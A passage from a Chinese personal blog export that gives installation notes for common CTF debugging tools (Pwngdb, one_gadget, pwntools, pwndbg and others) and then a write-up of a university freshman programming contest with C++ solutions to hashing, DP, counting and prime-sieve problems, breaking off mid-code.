<h2 id="4-Pwngdb"><a href="#4-Pwngdb" class="headerlink" title="4.Pwngdb"></a>4.Pwngdb</h2><blockquote>
<p>为了fmtarg</p>
<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;Pwngdb.git </span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;.gdbinit ~&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ fmtarg 0x7fffffffde50</span><br><span class="line">The index of format argument : 8 (&quot;\%7$p&quot;)	#看括号里面的</span><br></pre></td></tr></table></figure>
<h2 id="5-one-gadget"><a href="#5-one-gadget" class="headerlink" title="5.one_gadget"></a>5.one_gadget</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.安装rupy,具体见下面的注意</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>one_gadget要求较高得ruby版本，直接使用源里的太旧</p>
<p>解决方法：卸载掉本地的ruby、去官网添加最新版源</p>
<h2 id="6-ruby"><a href="#6-ruby" class="headerlink" title="6.ruby"></a>6.ruby</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#卸载ruby</span></span><br><span class="line">$ sudo apt-get remove ruby</span><br><span class="line"><span class="comment">#https://www.ruby-lang.org/en/downloads/ 下载安装包</span></span><br><span class="line"><span class="comment">#解压，安装</span></span><br><span class="line">$ $ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"><span class="comment">#安装one_gadget</span></span><br><span class="line">$ sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
<h2 id="7-pwntools"><a href="#7-pwntools" class="headerlink" title="7.pwntools"></a>7.pwntools</h2><p>ubuntu20.04：<a href="https://blog.csdn.net/Evaristexu/article/details/108025981" target="_blank" rel="noopener">https://blog.csdn.net/Evaristexu/article/details/108025981</a></p>
<p>其他ubuntu版本：<a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5451780.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install pwntools -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="8-xfce4"><a href="#8-xfce4" class="headerlink" title="8.xfce4"></a>8.xfce4</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><blockquote>
<p> 修改teminal背景</p>
</blockquote>
<h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install xfce4-terminal</span><br><span class="line">xfce4终端</span><br></pre></td></tr></table></figure>
<h2 id="9-seccomp-tools"><a href="#9-seccomp-tools" class="headerlink" title="9.seccomp-tools"></a>9.seccomp-tools</h2><blockquote>
<p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
<h2 id="10-LibcSearcher"><a href="#10-LibcSearcher" class="headerlink" title="10.LibcSearcher"></a>10.LibcSearcher</h2><p>github：<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">(sudo) python setup.py develop</span><br></pre></td></tr></table></figure>
<h2 id="11-pwn环境可视化"><a href="#11-pwn环境可视化" class="headerlink" title="11.pwn环境可视化"></a>11.pwn环境可视化</h2><ol>
<li><a href="https://bbs.pediy.com/thread-257344.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257344.htm</a></li>
<li><a href="https://github.com/bet4it/build-an-efficient-pwn-environment" target="_blank" rel="noopener">https://github.com/bet4it/build-an-efficient-pwn-environment</a></li>
</ol>
<h2 id="12-pip"><a href="#12-pip" class="headerlink" title="12.pip"></a>12.pip</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>
<h2 id="13-pwndbg"><a href="#13-pwndbg" class="headerlink" title="13.pwndbg"></a>13.pwndbg</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
<h2 id><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      <categories>
        <category>常用软件</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>西南科技大学2021届新生赛</title>
    <url>/2021/04/18/08-32/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>第二次选拔赛，，，，看这个成绩，，，，战况糟糕，，，只做出来了简单题，，，</p>
<p>秉持着什么比赛尽量复现一遍，，，，故今晚就干这个了。。。        ——2021.3.20</p>
<p>题解参考：<a href="https://ac.nowcoder.com/acm/discuss/blogs?tagId=140529" target="_blank" rel="noopener">https://ac.nowcoder.com/acm/discuss/blogs?tagId=140529</a></p>
<p>题目地址：<a href="https://ac.nowcoder.com/acm/contest/12478" target="_blank" rel="noopener">https://ac.nowcoder.com/acm/contest/12478</a></p>
</blockquote>
<h2 id="A-暗号1"><a href="#A-暗号1" class="headerlink" title="A 暗号1"></a>A 暗号1</h2><blockquote>
<p><del>wuwuwu,,,看着还行，，，就写出来容易超时，，，</del></p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>将字符串按照第一次出现的顺序替换【使得本质相同的字符串一样】</li>
<li>利用map对字符串进行映射，<code>&lt;string,int&gt;</code>，使得键对应字符串，值对应出现的次数</li>
<li>将map对应string的下标存入数组，最后的查询在区间内的下标个数即可。</li>
</ol>
<h3 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h3><ol>
<li>内部实现哈希表（散列表），将关键码值映射到hash表中的一个位置来访问</li>
<li>查找的时间复杂度位O（1）</li>
<li>元素的排列顺序是无序的。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;			//头文件</span></span></span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; id;		<span class="comment">//创建</span></span><br><span class="line">id[s] = ++tot;					   <span class="comment">//赋值</span></span><br></pre></td></tr></table></figure>
<h3 id="upper-bound和lower-bound"><a href="#upper-bound和lower-bound" class="headerlink" title="upper_bound和lower_bound"></a>upper_bound和lower_bound</h3><p>功能：利用<code>二分查找</code>的方法在一个<code>排好序的数组</code>中进行查找的。</p>
<p>特点：</p>
<ol>
<li>从begin到end-1的位置开始查找</li>
<li>二分查找，有序数组</li>
<li>返回找到数字的下标</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一个小于或等于num</span></span><br><span class="line">lower_bound(<span class="built_in">begin</span>,<span class="built_in">end</span>,num);</span><br><span class="line"><span class="comment">//第一个小于num的数字</span></span><br><span class="line">upper_bound(<span class="built_in">begin</span>,<span class="built_in">end</span>,num);</span><br></pre></td></tr></table></figure>
<h3 id="万能头文件"><a href="#万能头文件" class="headerlink" title="万能头文件"></a>万能头文件</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>包括了基本所有的头文件，，，方便使用。</p>
<p><a href="https://blog.csdn.net/prime_lee/article/details/80489284" target="_blank" rel="noopener">具体查看里面都有什么头文件请查看</a></p>
<h3 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h3><p>功能：初始化函数，将某一块内存中的内容全部设置为指定的值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;//emm</span></span></span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">-1</span>,<span class="keyword">sizeof</span>(vis));</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数：初始化数组</li>
<li>第二个参数：赋的值</li>
<li>第三个参数：大小</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vis[<span class="number">30</span>];<span class="comment">//存放某一字符(下标) 对应 转换的字符[存的只是1234...]</span></span><br><span class="line"><span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; id;<span class="comment">//存放某类字符串，，，是否出现过</span></span><br><span class="line"><span class="keyword">int</span> tot;<span class="comment">//存放出现过的字符类的数目</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span>;<span class="comment">//数组初始化，必须是const</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; e[N];<span class="comment">//存放的是，对应类字符串的下标</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">tran</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">-1</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">-1</span>;<span class="comment">//从a开始轮到的字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(vis[s[i] - <span class="string">'a'</span>] == <span class="number">-1</span>)&#123;<span class="comment">//该字符串还没转换</span></span><br><span class="line">            vis[s[i] - <span class="string">'a'</span>] = ++cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        s[i] = vis[s[i] - <span class="string">'a'</span>] + <span class="string">'a'</span>;<span class="comment">//变成字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> id,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> upper_bound(e[id].<span class="built_in">begin</span>(),e[id].<span class="built_in">end</span>(),r) - lower_bound(e[id].<span class="built_in">begin</span>(),e[id].<span class="built_in">end</span>(),l);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,q;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n ; ++i) &#123;<span class="comment">//这里要从1开始，因为l和r是从1开始，用来计算的下标也应是从1开始的</span></span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        s = tran(s);<span class="comment">//输入的字符串都进行转换</span></span><br><span class="line">        <span class="keyword">if</span>(!id[s])&#123;<span class="comment">//该类字符串没有出现过</span></span><br><span class="line">            id[s] = ++tot;</span><br><span class="line">        &#125;</span><br><span class="line">        e[id[s]].push_back(i);<span class="comment">//存入下标</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (q--)&#123;</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">        s = tran(s);</span><br><span class="line">        <span class="keyword">if</span>(!id[s])&#123;<span class="comment">//这类字符串没有出现过</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">get</span>(id[s],l,r)&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//通过大于区间 减去 小于 区间的，，，得到属于区间的个数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="B-暗号2"><a href="#B-暗号2" class="headerlink" title="B 暗号2"></a>B 暗号2</h2><blockquote>
<p><del>当时看第二题，，，一看对其做hash，感觉还好，，，好吧，我对什么感觉都还好，，但是不会做TATATAT</del></p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>使用动态规划dp来做，，，【只能说我看懂了， 能不能想到就难说了】</p>
<ol>
<li><code>dp[i][j]</code>表示<code>长度为i,bash值为j</code>的字符串有几个【第一个长度是len，21即可；第二个长度是p的最大值，100001即可】                                    初值：<code>dp[0][0] = 1</code></li>
<li>对于长度为i的字符串，它是长度为i-1的字符串（令hash值为j【因为hash值对p求余，故hash值小于p】）加上一个字符<code>k∈[0,26)</code>得到的，故得到最终的hash值是<code>（j*base+k）%p</code></li>
<li>长度为i的hash值如上，它的值是：<code>dp[i][v] = dp[i][v] + dp[i-1][j];</code>，</li>
<li>最后，输出的结果是<code>dp[n][hashsum]</code></li>
</ol>
<h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> i:s)</span><br></pre></td></tr></table></figure>
<h3 id="auto"><a href="#auto" class="headerlink" title="auto"></a>auto</h3><p>功能：根据后面的值,来自己推测前面的类型是什么。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">21</span>][<span class="number">100001</span>];       <span class="comment">//dp的数组</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> base,p,n;         <span class="comment">//最后都设为long long</span></span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;base&gt;&gt;p&gt;&gt;n&gt;&gt;s;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> hashsum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i:s) hashsum = (hashsum*base+i-<span class="string">'a'</span>)%p; <span class="comment">//求输入s的hash值</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;               <span class="comment">//设初值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;              <span class="comment">//这个一致即可</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; p; ++j) &#123;           <span class="comment">//hash值最大不超过p</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k) &#123;      <span class="comment">//补上最后一位的字符</span></span><br><span class="line">                <span class="keyword">int</span> v = (j * base + k) % p;     <span class="comment">//计算hash</span></span><br><span class="line">                dp[i][v] += dp[i<span class="number">-1</span>][j];         <span class="comment">//计算个数</span></span><br><span class="line">                dp[i][v] %= mod;                <span class="comment">//求余</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[n][hashsum]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="C-3-6数对"><a href="#C-3-6数对" class="headerlink" title="C 3.6数对"></a>C 3.6数对</h2><blockquote>
<p>题目是比较简单的，，，，比赛的时候也做出来了。。。但是题解更有意思，，，，提供一种思路</p>
</blockquote>
<h3 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> time=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>()<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; v.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(v[i] == <span class="number">2</span>*v[j] || v[i]*<span class="number">2</span> == v[j])&#123;<span class="comment">//一步一步判断，，，比较慢</span></span><br><span class="line">                time++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;time&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> n1;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n1;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span><span class="params">(n1,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n1; ++j) &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;v[j];</span><br><span class="line">        &#125;check(v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="题解【桶排】"><a href="#题解【桶排】" class="headerlink" title="题解【桶排】"></a>题解【桶排】</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>使用数组下标表示值，因为最大值才100，开辟一个101的数组空间即可</li>
<li>输入一个数x，让a[x]++，让数组里面存储下标对应的个数</li>
<li>最后ans是用循环+<code>a[i] * a[i*2]</code>得到的，因为多个值的话，其实就是乘积</li>
</ol>
<blockquote>
<p>高级，，，这种方法又称作桶排。</p>
<p><img src="/2021/04/18/08-32/image-20210321212749117.png" alt="image-20210321212749117"></p>
</blockquote>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">101</span>];<span class="comment">//因为输入的数最大为100，用一个100大小的空间即可</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;<span class="comment">//测试数据的写法</span></span><br><span class="line">        <span class="keyword">int</span> n;<span class="comment">//数组长度</span></span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));<span class="comment">//必须置0,避免影响其他轮数的计算</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;<span class="comment">//输入n组数据</span></span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">            a[x]++;<span class="comment">//用下标表示数字，用数组表示有几个。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">50</span> ; ++i) &#123;</span><br><span class="line">            ans += a[i] * a[i*<span class="number">2</span>];<span class="comment">//好想法。。。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="D-圆的交点"><a href="#D-圆的交点" class="headerlink" title="D 圆的交点"></a>D 圆的交点</h2><blockquote>
<p><del>思维题，，哭哭，好嘛，我也想过，只不过没想明白</del>  orz~~</p>
</blockquote>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>分为三种情况：</p>
<ol>
<li>相邻的交点</li>
</ol>
<p><img src="/2021/04/18/08-32/image-20210322142735301.png" alt="image-20210322142735301"></p>
<p>两两相交，交点有两个</p>
<p>组合方式计算：</p>
<p>a.一排横着两两相交：a种</p>
<p>b.共有b+1排</p>
<p>故此情况为a*(b+1)</p>
<p>同理，纵向两两相交：b种，共有a+1排</p>
<p>故此情况共有交点:<code>2*[a*(b+1)+b*(a+1)]</code></p>
<hr>
<p>2.斜对面</p>
<p><img src="/2021/04/18/08-32/image-20210322143100339.png" alt="image-20210322143100339"></p>
<p>这种情况，交点都在圆心处，，</p>
<hr>
<ol>
<li>相切</li>
</ol>
<p><img src="/2021/04/18/08-32/image-20210322143132384.png" alt="image-20210322143132384"></p>
<p>交点也都在圆心处，，，</p>
<p>所以，所有的圆心都是交点，也就是(a+1)*(b+1)，也就是所有圆的个数</p>
<hr>
<p>综上：所以最终答案为<code>2*[a*(b+1)+b*(a+1)]+(a+1)*(b+1)</code></p>
<hr>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-22.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> a,b;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(<span class="number">2</span>*( a*(b+<span class="number">1</span>) + b*(a+<span class="number">1</span>) ) + (a+<span class="number">1</span>)*(b+<span class="number">1</span>))%mod&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="E-孪生质数"><a href="#E-孪生质数" class="headerlink" title="E 孪生质数"></a>E 孪生质数</h2><blockquote>
<p><del>emm，这道题，，，，是真的搞不出来，虽然答案能算，但是超时，惨兮兮，涉及知识点盲区</del></p>
<p>设计了筛法计算质数，快速幂还有逆元（就是a的逆，，，），一个个来说说。</p>
</blockquote>
<h3 id="筛法求质数"><a href="#筛法求质数" class="headerlink" title="筛法求质数"></a>筛法求质数</h3><blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1va4y1J7pb?from=search&amp;seid=11299170599845424315" target="_blank" rel="noopener">[Rocky]埃氏筛与欧拉筛-C++竞赛级入门第十四节</a></li>
<li><a href="https://blog.csdn.net/qq_39763472/article/details/82428602" target="_blank" rel="noopener">欧拉筛法（线性筛）的学习理解</a></li>
<li><a href="https://www.luogu.com.cn/blog/hahahage/ou-la-shai-fa" target="_blank" rel="noopener">欧拉筛法</a></li>
</ul>
</blockquote>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>普通的求质数方法：两层循环，通过判断该数能否被从1开始的任意数整除，如果可以的话，为合数；都不可的话，为质数；</p>
<p>改进的普通筛法：已知2是质数，则令它与2，3，4…相乘得到的数都是合数，它的复杂度为O(NloglogN)</p>
<p>欧拉筛法：又称线性筛，它的时间复杂度为O(n)，普通筛法有问题是，同样的一个数，如24，他既会被2筛，也会被3、4、6、8、12筛掉，不好，所以它改进为一个合数只被它最小的质因数筛掉。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e7</span>+<span class="number">1e3</span>;</span><br><span class="line"><span class="keyword">bool</span> ok[N];<span class="comment">//用来进行筛选的数组</span></span><br><span class="line"><span class="keyword">int</span> prim[N];<span class="comment">//存有所有的质数</span></span><br><span class="line"><span class="keyword">int</span> pos=<span class="number">0</span>;<span class="comment">//代表当前质数的个数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; N;++i) &#123;<span class="comment">//质数是从2-N</span></span><br><span class="line">        <span class="keyword">if</span>(ok[i] == <span class="number">0</span>)&#123;<span class="comment">//0表示是质数</span></span><br><span class="line">            prim[pos++] = i;<span class="comment">//将该质数加入到prim数组中.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里是为了将最小质因数为i的其他合数都进行标记</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pos; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i*prim[j] &gt; N)<span class="comment">//超过范围</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ok[i*prim[j]] = <span class="number">1</span>;<span class="comment">//标记</span></span><br><span class="line">            <span class="keyword">if</span>(i%prim[j] == <span class="number">0</span>)<span 